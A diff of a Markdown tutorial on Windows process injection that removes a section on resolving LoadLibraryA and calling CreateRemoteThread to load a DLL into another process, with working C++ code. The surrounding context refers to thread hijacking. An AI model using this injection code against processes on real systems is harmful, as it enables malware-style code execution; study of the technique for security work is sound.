@@ -81,24 +81,6 @@ snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
 
 		ResumeThread(tHijacked);
 ```
-Retrieves the address of `LoadLibraryA()` from `kernel32.dll`. Calls `CreateRemoteThread()` to create a remote thread in the target process, which loads the specified DLL using LoadLibraryA().
-```cpp
-// Getting Address to the LoadLibraryA and converting it to the Thread routine
-	LPTHREAD_START_ROUTINE LoadModule = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
-	if (LoadModule == NULL) {
-		perror("[-] Couldn't find the module LoadLibraryA\n");
-		exit(-1);
-	}
-	// Creating remote thread 
-	// This will load our target module in the target process
-	hTargetModule = CreateRemoteThread(pHandle, NULL, 0, LoadModule, rBuffer, 0, NULL);
-	if (hTargetModule == INVALID_HANDLE_VALUE) {
-		perror("[-] Failed to load module in target process memory\n");
-		exit(-1);
-	}
-	wprintf(L"[+] Successfully loaded module in the memory...\n");
-	WaitForSingleObject(hTargetModule, 2000);
-```
 ## Full Code
 ```cpp
 #include <iostream>
